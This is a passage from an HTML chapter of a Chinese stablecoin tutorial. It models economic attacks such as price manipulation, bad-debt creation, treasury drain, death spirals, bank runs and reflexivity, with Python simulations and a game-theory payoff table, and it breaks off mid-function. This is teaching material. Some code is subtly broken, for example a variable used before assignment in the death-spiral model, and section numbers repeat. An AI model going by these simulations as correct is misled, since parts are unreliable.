<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>第十章：经济攻击与防御 - 区块链稳定币教程</title>
    <link rel="stylesheet" href="styles.css">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
</head>
<body>
    <!-- 导航栏 -->
    <nav class="navbar">
        <div class="container">
            <a href="index.html" class="navbar-brand">稳定币教程</a>
            <button class="navbar-toggle" onclick="toggleMobileNav()">☰</button>
            <ul class="navbar-nav">
                <li class="nav-item">
                    <a href="index.html" class="nav-link">首页</a>
                </li>
                <li class="nav-item">
                    <a href="intro.html" class="nav-link">引言</a>
                </li>
                <li class="nav-item dropdown">
                    <a href="#" class="nav-link">章节</a>
                    <div class="dropdown-menu">
                        <a href="chapter1.html" class="dropdown-item">第1章：区块链基础</a>
                        <a href="chapter2.html" class="dropdown-item">第2章：稳定币分类</a>
                        <a href="chapter3.html" class="dropdown-item">第3章：ERC-20标准</a>
                        <a href="chapter4.html" class="dropdown-item">第4章：抵押型设计</a>
                        <a href="chapter5.html" class="dropdown-item">第5章：数学模型</a>
                        <a href="chapter6.html" class="dropdown-item">第6章：AMM集成</a>
                        <a href="chapter7.html" class="dropdown-item">第7章：借贷协议</a>
                        <a href="chapter8.html" class="dropdown-item">第8章：收益策略</a>
                        <a href="chapter9.html" class="dropdown-item">第9章：智能合约安全</a>
                        <a href="chapter10.html" class="dropdown-item">第10章：经济攻击</a>
                        <a href="chapter11.html" class="dropdown-item">第11章：未来方向</a>
                        <a href="chapter12.html" class="dropdown-item">第12章：生产部署</a>
                        <a href="chapter13.html" class="dropdown-item">第13章：生态集成</a>
                    </div>
                </li>
                <li class="nav-item">
                    <a href="#resources" class="nav-link">资源</a>
                </li>
            </ul>
        </div>
    </nav>
    
    <!-- 头部 -->
    <header id="top">
        <div class="container">
            <h1>第十章：经济攻击与防御</h1>
        </div>
    </header>
    
    <!-- 主要内容 -->
    <div class="container">
        <div class="chapter">
<h2>第十章：经济攻击与防御</h2>
        
        <div class="chapter-intro">
            <p>稳定币系统不仅面临技术层面的威胁，更要应对复杂的经济攻击。本章深入分析各种经济攻击手段、博弈论模型，以及如何设计稳健的防御机制，确保稳定币系统在极端市场条件下的生存能力。</p>
        </div>

        <h3 id="economic-attack-models">10.1 经济攻击模型</h3>
        <div class="section-content">
            <p>稳定币系统面临多种经济攻击，理解这些攻击模型对设计防御机制至关重要。本节将从数学建模角度深入分析各类攻击的机理和传播路径。</p>
        </div>
        
        <div class="theory-section">
            <h4>10.1.0 攻击分类体系</h4>
            <p>从攻击机制角度，我们可以将经济攻击分为以下几大类：</p>
            <ul>
                <li><strong>基于预言机的攻击 (Oracle-based)</strong>: 通过操纵价格源影响系统决策</li>
                <li><strong>基于抵押品/储备的攻击 (Collateral/Reserve-based)</strong>: 利用资产价值波动制造系统性风险</li>
                <li><strong>基于协议逻辑的攻击 (Protocol Logic-based)</strong>: 利用机制设计缺陷进行套利或治理攻击</li>
                <li><strong>信贷/债务攻击 (Credit/Debt Attack)</strong>: 操纵债务参数制造不良债务</li>
                <li><strong>长期资本消耗攻击 (Long-term Capital Drain)</strong>: 持续微小套利缓慢消耗协议储备</li>
            </ul>
            
            <h4>10.1.1 攻击类型分类</h4>
            
            <h5>1. 市场操纵攻击</h5>
            <ul>
                <li><strong>价格操纵（Price Manipulation）</strong>：通过大额交易影响预言机价格</li>
                <li><strong>流动性攻击（Liquidity Attack）</strong>：耗尽特定池子的流动性</li>
                <li><strong>三明治攻击（Sandwich Attack）</strong>：在用户交易前后插入交易获利</li>
                <li><strong>时间强盗攻击（Time Bandit Attack）</strong>：通过区块重组获取MEV</li>
            </ul>
            
            <h5>2. 系统性攻击</h5>
            <ul>
                <li><strong>银行挤兑（Bank Run）</strong>：大规模赎回引发的连锁反应</li>
                <li><strong>死亡螺旋（Death Spiral）</strong>：负反馈循环导致系统崩溃</li>
                <li><strong>反身性攻击（Reflexivity Attack）</strong>：利用市场预期自我实现的特性</li>
                <li><strong>治理攻击（Governance Attack）</strong>：通过控制投票权改变系统参数</li>
                <li><strong>级联清算（Cascading Liquidation）</strong>：连环清算引发的系统性风险</li>
            </ul>
            
            <h5>3. 新型经济攻击模式</h5>
            <p>除了传统攻击外，2024年出现了更加隐蔽和复杂的攻击模式：</p>
            
            <ul>
                <li><strong>信贷/债务攻击（Credit/Debt Attack）</strong>：通过操纵债务上限、清算参数制造系统性风险</li>
                <li><strong>长期资本消耗攻击（Long-term Capital Drain）</strong>：持续小额套利，缓慢消耗协议资本</li>
                <li><strong>再质押风险攻击（Restaking Risk Attack）</strong>：利用LRT多层风险叠加的脆弱性</li>
                <li><strong>跨链桥攻击（Bridge Attack）</strong>：攻击薄弱跨链桥，稀释稳定币价值</li>
            </ul>
            
            <h5>4. 反身性理论与稳定币</h5>
            <p>反身性（Reflexivity）是索罗斯提出的核心概念，在稳定币系统中表现尤为明显。市场参与者的预期会影响市场价格，而价格变化又会强化或改变预期，形成自我强化的循环。</p>
            
            <div class="code-block">
                <div class="code-header">
                    Python 代码 <span class="toggle-icon">▼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python"># 经济攻击收益模型
import numpy as np
from typing import Dict, Tuple

class EconomicAttackModel:
    def __init__(self, protocol_params: Dict):
        self.liquidity = protocol_params['liquidity']
        self.fee_rate = protocol_params['fee_rate']
        self.slippage_factor = protocol_params['slippage_factor']
        self.oracle_delay = protocol_params['oracle_delay']
    
    def calculate_manipulation_profit(
        self, 
        attack_capital: float,
        market_impact: float,
        manipulation_duration: int
    ) -> Tuple[float, float]:
        """计算价格操纵攻击的潜在收益"""
        
        # 操纵成本：交易费用 + 滑点损失
        manipulation_cost = (
            attack_capital * self.fee_rate * 2 +  # 买入+卖出
            attack_capital * self.slippage_factor * market_impact
        )
        
        # 价格影响
        price_impact = market_impact * (attack_capital / self.liquidity)
        
        # 套利机会窗口
        arbitrage_window = min(manipulation_duration, self.oracle_delay)
        
        # 潜在收益：价格差 × 可套利金额
        potential_profit = price_impact * min(
            attack_capital * 0.5,  # 假设最多利用50%资金套利
            self.liquidity * 0.1   # 不能超过流动性的10%
        ) * arbitrage_window
        
        # 净收益
        net_profit = potential_profit - manipulation_cost
        
        # 成功概率（考虑MEV竞争）
        success_probability = 1 / (1 + np.exp(-arbitrage_window + 2))
        
        return net_profit, success_probability
    
    def simulate_bank_run(
        self,
        initial_redemption_rate: float,
        contagion_factor: float,
        reserve_ratio: float,
        time_steps: int = 100
    ) -> np.ndarray:
        """模拟银行挤兑场景"""
        
        redemption_history = np.zeros(time_steps)
        reserves = 1.0  # 标准化储备为1
        
        for t in range(time_steps):
            # 挤兑强度随储备减少而增加
            panic_multiplier = 1 + contagion_factor * (1 - reserves)
            
            # 当期赎回率
            current_redemption = min(
                initial_redemption_rate * panic_multiplier * (1.1 ** t),
                reserves  # 不能超过剩余储备
            )
            
            redemption_history[t] = current_redemption
            reserves -= current_redemption
            
            # 储备耗尽，系统崩溃
            if reserves <= 0:
                redemption_history[t+1:] = 0
                break
            
            # 如果储备率过低，触发死亡螺旋
            if reserves < reserve_ratio * 0.5:
                initial_redemption_rate *= 1.5
        
        return redemption_history
    
    def calculate_mev_extraction(
        self,
        transaction_value: float,
        gas_price: float,
        block_space_competition: float
    ) -> float:
        """计算MEV提取的期望收益"""
        
        # 基础MEV机会
        base_mev = transaction_value * 0.03  # 假设3%的价值可提取
        
        # 竞争因子（更多竞争者降低收益）
        competition_discount = 1 / (1 + block_space_competition)
        
        # Gas成本
        gas_cost = gas_price * 200000  # 假设复杂交易需要20万gas
        
        # 期望MEV收益
        expected_mev = base_mev * competition_discount - gas_cost
        
        return max(0, expected_mev)

# 使用示例
protocol = {
    'liquidity': 10_000_000,  # 1000万美元流动性
    'fee_rate': 0.003,        # 0.3%手续费
    'slippage_factor': 0.01,  # 1%基础滑点
    'oracle_delay': 10        # 10个区块的预言机延迟
}

model = EconomicAttackModel(protocol)

# 分析价格操纵攻击
profit, prob = model.calculate_manipulation_profit(
    attack_capital=1_000_000,  # 100万美元攻击资金
    market_impact=0.1,         # 10%市场影响
    manipulation_duration=5    # 5个区块
)

print(f"攻击净收益: ${profit:,.2f}")
print(f"成功概率: {prob:.2%}")</code></pre>
                </div>
            </div>
            
            <h4>10.1.2 信贷/债务攻击模型</h4>
            <p>在超额抵押稳定币系统中，攻击者可以通过操纵债务参数来制造系统性风险：</p>
            
            <div class="code-block">
                <div class="code-header">
                    Python 代码 <span class="toggle-icon">▼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python"># 信贷/债务攻击建模
class CreditDebtAttack:
    """模拟针对MakerDAO类型系统的信贷攻击"""
    
    def __init__(self, protocol_params: dict):
        self.debt_ceiling = protocol_params['debt_ceiling']
        self.stability_fee = protocol_params['stability_fee']
        self.liquidation_ratio = protocol_params['liquidation_ratio']
        self.liquidation_penalty = protocol_params['liquidation_penalty']
        self.governance_token_supply = protocol_params['governance_token_supply']
        
    def calculate_bad_debt_creation(self, 
                                   collateral_volatility: float,
                                   attacker_capital: float,
                                   market_conditions: dict) -> dict:
        """计算恶意创建坏账的成本与影响"""
        
        # 攻击者可以开设的最大债务头寸
        max_debt_position = attacker_capital * self.liquidation_ratio
        
        # 在极端市场条件下的预期损失
        extreme_drop = market_conditions['black_swan_probability'] * market_conditions['max_drawdown']
        
        # 制造坏账的预期成本
        bad_debt_cost = max_debt_position * (extreme_drop - (1 - 1/self.liquidation_ratio))
        
        # 对系统的影响
        system_impact = {
            'bad_debt_amount': max(0, bad_debt_cost),
            'debt_ceiling_utilization': max_debt_position / self.debt_ceiling,
            'required_mkr_mint': bad_debt_cost / market_conditions['mkr_price'],  # 需要铸造的MKR
            'mkr_dilution': bad_debt_cost / (market_conditions['mkr_price'] * self.governance_token_supply)
        }
        
        return system_impact
    
    def simulate_debt_ceiling_manipulation(self, 
                                         governance_control: float,
                                         time_horizon: int) -> list:
        """模拟通过治理操纵债务上限的攻击"""
        results = []
        current_ceiling = self.debt_ceiling
        
        for t in range(time_horizon):
            # 治理提案通过概率
            proposal_success = governance_control > 0.5  # 简化：超过50%控制权
            
            if proposal_success:
                # 每次可以提高20%债务上限
                current_ceiling *= 1.2
                
                # 系统风险指标
                risk_score = self._calculate_systemic_risk(current_ceiling)
                
                results.append({
                    'time': t,
                    'debt_ceiling': current_ceiling,
                    'risk_score': risk_score,
                    'insolvency_probability': 1 - np.exp(-risk_score)
                })
        
        return results
    
    def _calculate_systemic_risk(self, debt_ceiling: float) -> float:
        """计算系统性风险评分"""
        # 债务上限相对于抵押品总价值的比率
        leverage_ratio = debt_ceiling / (debt_ceiling * self.liquidation_ratio)
        
        # 风险随杠杆指数增长
        risk_score = leverage_ratio ** 2 * 0.1
        
        return min(risk_score, 1.0)

# 使用示例
maker_params = {
    'debt_ceiling': 10_000_000_000,  # 100亿美元
    'stability_fee': 0.05,  # 5%年化
    'liquidation_ratio': 1.5,  # 150%
    'liquidation_penalty': 0.13,  # 13%
    'governance_token_supply': 1_000_000  # 100万MKR
}

attacker = CreditDebtAttack(maker_params)

# 分析坏账攻击
market_conditions = {
    'black_swan_probability': 0.01,
    'max_drawdown': 0.5,
    'mkr_price': 2000
}

impact = attacker.calculate_bad_debt_creation(
    collateral_volatility=0.8,
    attacker_capital=50_000_000,  # 5000万美元
    market_conditions=market_conditions
)

print(f"潜在坏账: ${impact['bad_debt_amount']:,.0f}")
print(f"MKR稀释: {impact['mkr_dilution']:.2%}")</code></pre>
                </div>
            </div>
            
            <h4>10.1.3 长期资本消耗攻击</h4>
            <p>这种攻击通过持续的小额套利缓慢消耗协议的资本储备：</p>
            
            <div class="code-block">
                <div class="code-header">
                    Python 代码 <span class="toggle-icon">▼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python"># 长期资本消耗攻击模拟
class LongTermDrainAttack:
    """模拟缓慢消耗协议资本的攻击策略"""
    
    def __init__(self, protocol: dict):
        self.treasury_size = protocol['treasury_size']
        self.daily_volume = protocol['daily_volume']
        self.fee_structure = protocol['fee_structure']
        self.arbitrage_opportunities = protocol['arbitrage_opportunities']
        
    def calculate_drain_rate(self, 
                           attacker_sophistication: float,
                           market_inefficiency: float) -> dict:
        """计算资本消耗速率"""
        
        # 每日可捕获的套利机会
        daily_arbitrage = (
            self.daily_volume * 
            market_inefficiency * 
            attacker_sophistication * 
            self.arbitrage_opportunities
        )
        
        # 协议的防御能力（通过费用回收）
        protocol_recovery = self.daily_volume * self.fee_structure['base_fee']
        
        # 净消耗率
        net_drain = daily_arbitrage - protocol_recovery
        
        # 预计耗尽时间
        if net_drain > 0:
            depletion_time = self.treasury_size / net_drain
        else:
            depletion_time = float('inf')
        
        return {
            'daily_drain': net_drain,
            'drain_percentage': net_drain / self.treasury_size,
            'depletion_days': depletion_time,
            'annual_loss': net_drain * 365
        }
    
    def simulate_adaptive_attack(self, days: int) -> list:
        """模拟自适应的消耗攻击"""
        results = []
        remaining_treasury = self.treasury_size
        
        for day in range(days):
            # 攻击者根据剩余资金调整策略
            aggressiveness = 1 - (remaining_treasury / self.treasury_size)
            
            # 随着资金减少，套利机会增加（流动性降低）
            market_inefficiency = 0.001 * (1 + aggressiveness * 2)
            
            drain = self.calculate_drain_rate(
                attacker_sophistication=0.8,
                market_inefficiency=market_inefficiency
            )
            
            remaining_treasury -= drain['daily_drain']
            
            results.append({
                'day': day,
                'treasury': remaining_treasury,
                'daily_drain': drain['daily_drain'],
                'health_score': remaining_treasury / self.treasury_size
            })
            
            if remaining_treasury <= 0:
                break
        
        return results

# 示例：分析Curve等协议的长期风险
curve_protocol = {
    'treasury_size': 50_000_000,  # 5000万美元
    'daily_volume': 500_000_000,  # 5亿美元
    'fee_structure': {'base_fee': 0.0004},  # 0.04%
    'arbitrage_opportunities': 0.01  # 1%的交易存在套利机会
}

drain_attack = LongTermDrainAttack(curve_protocol)

# 分析消耗率
drain_analysis = drain_attack.calculate_drain_rate(
    attacker_sophistication=0.7,  # 中等水平攻击者
    market_inefficiency=0.002     # 0.2%市场非效率
)

print(f"每日资本消耗: ${drain_analysis['daily_drain']:,.0f}")
print(f"预计耗尽时间: {drain_analysis['depletion_days']:.0f} 天")</code></pre>
                </div>
            </div>
            
            <h4>10.1.2 死亡螺旋（Death Spiral）深度分析</h4>
            <p>算法稳定币特有的攻击模式，通过数学模型量化其演化过程：</p>
            
            <div class="theory-box">
                <h5>死亡螺旋的状态方程建模</h5>
                <p>定义系统状态变量：</p>
                <ul>
                    <li>P<sub>t</sub>: 治理代币在时间t的价格</li>
                    <li>S<sub>t</sub>: 稳定币供应量</li>
                    <li>R<sub>t</sub>: 协议储备金价值</li>
                    <li>D<sub>t</sub>: 稳定币偏离锚定程度</li>
                </ul>
                
                <p>递归关系：</p>
                <pre>P_t = P_{t-1} × (1 - α × D_{t-1} - β × ΔS_{t-1}/S_{t-1})
S_t = S_{t-1} × (1 - γ × max(0, D_{t-1}))
R_t = R_{t-1} + P_t × M_t - Redemption_t
D_t = |1 - Price_{stable,t}|</pre>
                
                <p>其中：</p>
                <ul>
                    <li>α: 价格对脱锚的敏感度</li>
                    <li>β: 供应量变化的价格冲击系数</li>
                    <li>γ: 赎回率参数</li>
                    <li>M<sub>t</sub>: 新铸造的治理代币数量</li>
                </ul>
            </div>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>▶ Python: 死亡螺旋模拟器</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python">import numpy as np
import matplotlib.pyplot as plt
from scipy.integrate import odeint

class DeathSpiralSimulator:
    def __init__(self, alpha=0.3, beta=0.5, gamma=0.2, 
                 initial_price=100, initial_supply=1e9):
        self.alpha = alpha  # 价格对脱锚的敏感度
        self.beta = beta    # 供应量变化的价格冲击
        self.gamma = gamma  # 赎回率参数
        self.P0 = initial_price
        self.S0 = initial_supply
        
    def dynamics(self, state, t, shock_time=50, shock_magnitude=0.2):
        P, S, D = state
        
        # 外部冲击
        if t >= shock_time and t <= shock_time + 1:
            D = shock_magnitude
        else:
            # 稳定币价格动态（简化模型）
            D = max(0, D - 0.01 + 0.1 * (1 - P/self.P0))
        
        # 治理代币价格动态
        dP_dt = -P * (self.alpha * D + self.beta * max(0, -dS_dt/S))
        
        # 供应量动态（赎回）
        dS_dt = -S * self.gamma * max(0, D)
        
        # 脱锚程度变化
        dD_dt = 0.05 * (1 - P/self.P0) - 0.02
        
        return [dP_dt, dS_dt, dD_dt]
    
    def simulate(self, T=200, shock_time=50, shock_magnitude=0.2):
        t = np.linspace(0, T, 1000)
        initial_state = [self.P0, self.S0, 0]
        
        solution = odeint(self.dynamics, initial_state, t, 
                         args=(shock_time, shock_magnitude))
        
        return t, solution
    
    def plot_results(self, t, solution):
        P, S, D = solution.T
        
        fig, axes = plt.subplots(3, 1, figsize=(10, 8))
        
        # 治理代币价格
        axes[0].plot(t, P)
        axes[0].set_ylabel('治理代币价格')
        axes[0].axhline(y=self.P0, color='r', linestyle='--', alpha=0.5)
        
        # 稳定币供应量
        axes[1].plot(t, S/1e9)
        axes[1].set_ylabel('稳定币供应量 (B)')
        
        # 脱锚程度
        axes[2].plot(t, D)
        axes[2].set_ylabel('脱锚程度')
        axes[2].set_xlabel('时间')
        axes[2].axhline(y=0, color='g', linestyle='--', alpha=0.5)
        
        plt.tight_layout()
        return fig

# 运行模拟
simulator = DeathSpiralSimulator()
t, solution = simulator.simulate()
fig = simulator.plot_results(t, solution)

# 分析临界点
P = solution[:, 0]
critical_point = np.where(P < 0.1 * simulator.P0)[0]
if len(critical_point) > 0:
    print(f"系统崩溃时间: t = {t[critical_point[0]]:.2f}")
    print(f"崩溃时治理代币价格: ${P[critical_point[0]]:.2f}")</code></pre>
                </div>
            </div>
            
            <h4>10.1.3 银行挤兑（Bank Run）模型</h4>
            <p>基于Diamond-Dybvig模型的深入分析，参数化稳定币系统的挤兑风险：</p>
            
            <div class="theory-box">
                <h5>参数化Diamond-Dybvig模型</h5>
                <p>将经典银行挤兑模型映射到稳定币系统：</p>
                <ul>
                    <li><strong>R</strong> (长期投资回报) → 稳定币协议收益率（如质押收益）</li>
                    <li><strong>L</strong> (短期取款惩罚) → 赎回费用或滑点损失</li>
                    <li><strong>p</strong> (恐慌概率) → 基于链上数据的恐慌指标</li>
                </ul>
                
                <p>挤兑临界条件：当以下不等式成立时，理性用户选择挤兑：</p>
                <pre>E[U(early_withdrawal)] > E[U(wait)]
即: u(1-L) > p × u(0) + (1-p) × u(R)</pre>
                
                <p>恐慌概率估计：</p>
                <pre>p = σ(w₁ × large_withdrawals + w₂ × price_deviation + w₃ × social_sentiment)</pre>
                其中σ是sigmoid函数，w是权重参数</p>
            </div>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>▶ Python: 银行挤兑博弈分析</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python">import numpy as np
from scipy.optimize import fsolve
import matplotlib.pyplot as plt

class BankRunModel:
    def __init__(self, R=1.2, L=0.05, withdrawal_cost=0.02):
        self.R = R  # 长期回报率
        self.L = L  # 流动性损失
        self.withdrawal_cost = withdrawal_cost
        
    def utility(self, x, risk_aversion=2):
        """CRRA效用函数"""
        if risk_aversion == 1:
            return np.log(x)
        return (x**(1-risk_aversion) - 1) / (1-risk_aversion)
    
    def panic_probability(self, large_withdrawals, price_deviation, 
                         social_sentiment, weights=[0.4, 0.4, 0.2]):
        """基于链上数据估计恐慌概率"""
        signal = (weights[0] * large_withdrawals + 
                 weights[1] * price_deviation + 
                 weights[2] * social_sentiment)
        return 1 / (1 + np.exp(-5 * (signal - 0.5)))
    
    def find_equilibrium(self, p):
        """找到给定恐慌概率下的均衡"""
        # 提前取款的期望效用
        early_utility = self.utility(1 - self.L)
        
        # 等待的期望效用
        wait_utility = (p * self.utility(0.01) +  # 挤兑发生时几乎没有回报
                       (1-p) * self.utility(self.R))
        
        return early_utility - wait_utility
    
    def critical_mass_analysis(self):
        """分析触发挤兑的临界质量"""
        p_values = np.linspace(0, 1, 100)
        equilibrium_diff = [self.find_equilibrium(p) for p in p_values]
        
        # 找到均衡转换点
        sign_changes = np.where(np.diff(np.sign(equilibrium_diff)))[0]
        
        if len(sign_changes) > 0:
            critical_p = p_values[sign_changes[0]]
            return critical_p
        return None
    
    def simulate_contagion(self, initial_withdrawers=0.1, steps=50):
        """模拟挤兑传染过程"""
        withdrawers = [initial_withdrawers]
        
        for t in range(steps):
            # 当前恐慌概率基于提款比例
            p = self.panic_probability(withdrawers[-1], 0.1, 0.1)
            
            # 新增提款者基于期望效用差异
            utility_diff = self.find_equilibrium(p)
            if utility_diff > 0:
                # 挤兑加速
                new_withdrawers = min(1.0, withdrawers[-1] * (1 + 0.2))
            else:
                # 挤兑减缓
                new_withdrawers = max(0, withdrawers[-1] * 0.95)
            
            withdrawers.append(new_withdrawers)
        
        return withdrawers

# 分析示例
model = BankRunModel(R=1.15, L=0.03)
critical_p = model.critical_mass_analysis()
print(f"触发挤兑的临界恐慌概率: {critical_p:.3f}")

# 模拟挤兑传染
withdrawers = model.simulate_contagion(initial_withdrawers=0.15)

plt.figure(figsize=(10, 6))
plt.plot(withdrawers, linewidth=2)
plt.axhline(y=critical_p, color='r', linestyle='--', 
            label=f'临界点 ({critical_p:.3f})')
plt.xlabel('时间步')
plt.ylabel('提款者比例')
plt.title('银行挤兑传染动态')
plt.legend()
plt.grid(True, alpha=0.3)
plt.show()</code></pre>
                </div>
            </div>
            
            <h4>10.1.4 反身性攻击（Reflexivity Attack）</h4>
            <p>基于索罗斯反身性理论，量化市场预期与基本面的相互作用：</p>
            
            <div class="theory-box">
                <h5>反身性动力学模型</h5>
                <p>核心方程：</p>
                <pre>市场价格 P(t) = f(基本面 F(t), 市场预期 E[P(t+1)])
基本面 F(t) = g(市场价格 P(t-1), 外部因素 X(t))</pre>
                
                <p>对于稳定币系统：</p>
                <ul>
                    <li>当P < $1时，负面预期导致赎回增加</li>
                    <li>赎回增加导致抵押品抛售，压低抵押品价格</li>
                    <li>抵押品价值下降恶化基本面，进一步压低稳定币价格</li>
                    <li>形成自我强化的负反馈循环</li>
                </ul>
            </div>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>▶ Python: 反身性攻击模拟</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python">class ReflexivityAttackModel:
    def __init__(self, expectation_weight=0.6, fundamental_weight=0.4):
        self.alpha = expectation_weight
        self.beta = fundamental_weight
        self.sentiment_decay = 0.95  # 情绪衰减因子
        
    def price_formation(self, fundamental, expected_price):
        """价格形成机制"""
        return self.beta * fundamental + self.alpha * expected_price
    
    def fundamental_dynamics(self, price, collateral_value, reserve_ratio):
        """基本面动态"""
        # 基本面 = 抵押品价值 / 稳定币供应量
        fundamental = collateral_value * reserve_ratio
        
        # 价格偏离会影响抵押品价值（抛售压力）
        if price < 1.0:
            selling_pressure = (1.0 - price) * 0.5
            collateral_value *= (1 - selling_pressure)
        
        return fundamental, collateral_value
    
    def expectation_formation(self, price_history, sentiment):
        """预期形成机制（自适应预期 + 市场情绪）"""
        if len(price_history) < 2:
            return 1.0
        
        # 趋势外推
        trend = price_history[-1] - price_history[-2]
        adaptive_expectation = price_history[-1] + trend * 0.5
        
        # 情绪影响
        sentiment_adjustment = (sentiment - 0.5) * 0.2
        
        return adaptive_expectation + sentiment_adjustment
    
    def simulate_attack(self, initial_sentiment_shock=-0.3, periods=100):
        """模拟反身性攻击"""
        # 初始状态
        price_history = [1.0]
        fundamental = 1.0
        collateral_value = 1e8  # $100M
        reserve_ratio = 1.5
        sentiment = 0.5  # 中性情绪
        
        fundamentals = [fundamental]
        sentiments = [sentiment]
        
        for t in range(periods):
            # 攻击者在t=10时制造负面情绪
            if t == 10:
                sentiment += initial_sentiment_shock
            
            # 形成预期
            expected_price = self.expectation_formation(price_history, sentiment)
            
            # 价格形成
            price = self.price_formation(fundamental, expected_price)
            price_history.append(price)
            
            # 基本面更新
            fundamental, collateral_value = self.fundamental_dynamics(
                price, collateral_value, reserve_ratio
            )
            fundamentals.append(fundamental)
            
            # 情绪演化（均值回归 + 价格反馈）
            sentiment = sentiment * self.sentiment_decay + 0.5 * (1 - self.sentiment_decay)
            if price < 0.98:  # 价格下跌加剧恐慌
                sentiment -= 0.02
            sentiment = np.clip(sentiment, 0, 1)
            sentiments.append(sentiment)
            
            # 系统崩溃检查
            if price < 0.5 or collateral_value < 1e7:
                print(f"系统在第{t}期崩溃")
                break
        
        return price_history, fundamentals, sentiments

# 运行反身性攻击模拟
model = ReflexivityAttackModel()
prices, fundamentals, sentiments = model.simulate_attack()

# 可视化结果
fig, axes = plt.subplots(3, 1, figsize=(10, 9))

# 价格轨迹
axes[0].plot(prices, 'b-', linewidth=2)
axes[0].axhline(y=1.0, color='r', linestyle='--', alpha=0.5)
axes[0].fill_between(range(len(prices)), 0.98, 1.02, alpha=0.2, color='gray')
axes[0].set_ylabel('稳定币价格')
axes[0].set_title('反身性攻击下的价格动态')

# 基本面
axes[1].plot(fundamentals, 'g-', linewidth=2)
axes[1].set_ylabel('基本面价值')

# 市场情绪
axes[2].plot(sentiments, 'r-', linewidth=2)
axes[2].axhline(y=0.5, color='gray', linestyle='--', alpha=0.5)
axes[2].set_ylabel('市场情绪')
axes[2].set_xlabel('时间')

plt.tight_layout()
plt.show()</code></pre>
                </div>
            </div>
            
            <h4>10.1.5 博弈论分析</h4>
            <p>多方博弈中的纳什均衡与攻击激励分析：</p>
            
            <div class="theory-box">
                <h5>攻击收益矩阵</h5>
                <p>定义攻击者和防御者的收益函数：</p>
                <table class="protocol-comparison">
                    <tr>
                        <th></th>
                        <th>防御者：被动防御</th>
                        <th>防御者：主动监控</th>
                        <th>防御者：动态调整</th>
                    </tr>
                    <tr>
                        <td><strong>攻击者：价格操纵</strong></td>
                        <td>(10, -20)</td>
                        <td>(-5, -10)</td>
                        <td>(-10, -5)</td>
                    </tr>
                    <tr>
                        <td><strong>攻击者：闪电贷攻击</strong></td>
                        <td>(15, -30)</td>
                        <td>(5, -15)</td>
                        <td>(-8, -8)</td>
                    </tr>
                    <tr>
                        <td><strong>攻击者：治理攻击</strong></td>
                        <td>(8, -15)</td>
                        <td>(3, -8)</td>
                        <td>(0, -3)</td>
                    </tr>
                </table>
                <p class="note">数值表示（攻击者收益，防御者损失），单位：预期利润率%</p>
            </div>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>▶ Python: 稳定币系统博弈分析</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python">import numpy as np
from scipy.optimize import minimize
import matplotlib.pyplot as plt
from mpl_toolkits.mplot3d import Axes3D

class StablecoinGameTheory:
    def __init__(self):
        # 定义收益矩阵
        self.payoff_matrix = {
            'price_manipulation': {
                'passive': (10, -20),
                'monitor': (-5, -10),
                'dynamic': (-10, -5)
            },
            'flash_loan': {
                'passive': (15, -30),
                'monitor': (5, -15),
                'dynamic': (-8, -8)
            },
            'governance': {
                'passive': (8, -15),
                'monitor': (3, -8),
                'dynamic': (0, -3)
            }
        }
        
    def calculate_mixed_strategy_nash(self):
        """计算混合策略纳什均衡"""
        # 简化为2x2博弈进行演示
        # 攻击者：价格操纵 vs 闪电贷
        # 防御者：被动 vs 主动
        A = np.array([[10, -5], [15, 5]])  # 攻击者收益
        B = np.array([[-20, -10], [-30, -15]])  # 防御者收益（转为正值）
        B = -B
        
        # 使用线性规划求解混合策略
        from scipy.optimize import linprog
        
        # 攻击者的混合策略
        c = [0, 0, -1]  # 最大化期望收益
        A_ub = np.array([[-A[0,0], -A[1,0], 1],
                        [-A[0,1], -A[1,1], 1]])
        b_ub = [0, 0]
        A_eq = [[1, 1, 0]]
        b_eq = [1]
        bounds = [(0, 1), (0, 1), (None, None)]
        
        result_attacker = linprog(c, A_ub=A_ub, b_ub=b_ub, 
                                 A_eq=A_eq, b_eq=b_eq, bounds=bounds)
        
        return result_attacker.x[:2]
    
    def simulate_evolutionary_dynamics(self, iterations=1000):
        """模拟演化博弈动态"""
        # 初始策略分布
        attacker_strategies = np.array([0.33, 0.33, 0.34])  # 三种攻击
        defender_strategies = np.array([0.33, 0.33, 0.34])  # 三种防御
        
        history = {
            'attacker': [attacker_strategies.copy()],
            'defender': [defender_strategies.copy()]
        }
        
        for _ in range(iterations):
            # 计算期望收益
            attacker_payoffs = self.calculate_expected_payoffs(
                attacker_strategies, defender_strategies, 'attacker'
            )
            defender_payoffs = self.calculate_expected_payoffs(
                attacker_strategies, defender_strategies, 'defender'
            )
            
            # 复制动态更新
            avg_payoff_a = np.dot(attacker_strategies, attacker_payoffs)
            avg_payoff_d = np.dot(defender_strategies, defender_payoffs)
            
            attacker_strategies += 0.01 * attacker_strategies * \
                                  (attacker_payoffs - avg_payoff_a)
            defender_strategies += 0.01 * defender_strategies * \
                                  (defender_payoffs - avg_payoff_d)
            
            # 归一化
            attacker_strategies /= attacker_strategies.sum()
            defender_strategies /= defender_strategies.sum()
            
            history['attacker'].append(attacker_strategies.copy())
            history['defender'].append(defender_strategies.copy())
        
        return history
    
    def calculate_expected_payoffs(self, attacker_strat, defender_strat, player):
        """计算期望收益"""
        attacks = ['price_manipulation', 'flash_loan', 'governance']
        defenses = ['passive', 'monitor', 'dynamic']
        
        if player == 'attacker':
            payoffs = np.zeros(3)
            for i, attack in enumerate(attacks):
                for j, defense in enumerate(defenses):
                    payoffs[i] += defender_strat[j] * \
                                 self.payoff_matrix[attack][defense][0]
        else:
            payoffs = np.zeros(3)
